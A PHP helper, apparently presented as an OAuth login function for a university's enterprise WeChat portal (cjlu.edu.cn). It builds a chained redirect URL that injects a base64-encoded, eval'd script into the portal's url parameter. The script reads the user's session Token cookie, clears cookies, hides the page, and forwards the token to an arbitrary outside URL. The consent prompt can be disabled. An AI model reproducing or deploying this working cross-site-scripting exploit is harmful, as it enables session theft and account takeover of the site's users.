<?
function cjlu_oauth_geturl($targeturl,$failbackurl,$show_confirm=true){
    $conf = $show_confirm?"false":"true";
    
    if(strpos($targeturl,"?")==-1){
        $targeturl.="?";
    }
    
    $targetScript = '
var d=document,i=d.getElementsByTagName("iframe")[0];
var e=d.createElement("div"),cc=0;
e.setAttribute("style","position:fixed;top:0;left:0;right:0;text-align:center;");
setInterval(()=>e.innerText="\u6B63\u5728\u83B7\u53D6\u767B\u5F55\u51ED\u636E"+"...".substring(0,(++cc%4)),700);
d.body.appendChild(e)
d.querySelector(".mui-content").style.opacity=d.querySelector(".mui-bar-tab").style.opacity=d.querySelector(".mui-bar-nav").style.opacity="0.001";
var aa=d.cookie;d.cookie="";
if(aa.indexOf("qywx.cjlu.edu.cn.80.Token")!=-1)
setTimeout(()=>{('.$conf.'||confirm("\u60A8\u7684\u767B\u5F55\u5C06\u88AB\u53D1\u9001\u81F3\u5176\u4ED6\u7F51\u7AD9\u5904\u7406"))?(location.href="'.$targeturl.'&token="+encodeURIComponent(aa)):(location.href="'.$failbackurl.'")},100);
else{
var b=d.createElement("meta");b.setAttribute("http-equiv","Content-Security-Policy");b.setAttribute("content","upgrade-insecure-requests");d.getElementsByTagName("head")[0].appendChild(b);
i.src="https://authserver.cjlu.edu.cn/authserver/login?service=http%3a%2f%2fqywx.cjlu.edu.cn%2fpages%2fThirdServer%2fThirdLogon.aspx";
i.onload=()=>location.reload();
}
    ';
    
    $flvl1 = 'data:text/html;base64,PGh0bWw+PGJvZHk+PGgxPjxzY3JpcHQ+ZG9jdW1lbnQud3JpdGUoIlx1MDA0Rlx1MDA0MVx1MDA3NVx1MDA3NFx1MDA2OFx1MDAyMFx1OERGM1x1OEY2Q1x1OTg3NVx1OTc2MiIpPC9zY3JpcHQ+PC9oMT48L2JvZHk+PC9odG1sPiAg"></iframe><script>eval(atob("'.base64_encode($targetScript).'"))</script><iframe>';
    
    $flvl2 = 'https://qywx.cjlu.edu.cn/Pages/Default/index.html?url='.urlencode($flvl1);
    
    $flvl3 = 'https://authserver.cjlu.edu.cn/authserver/login?service='.urlencode($flvl2);
    
    return $flvl3;
}

?>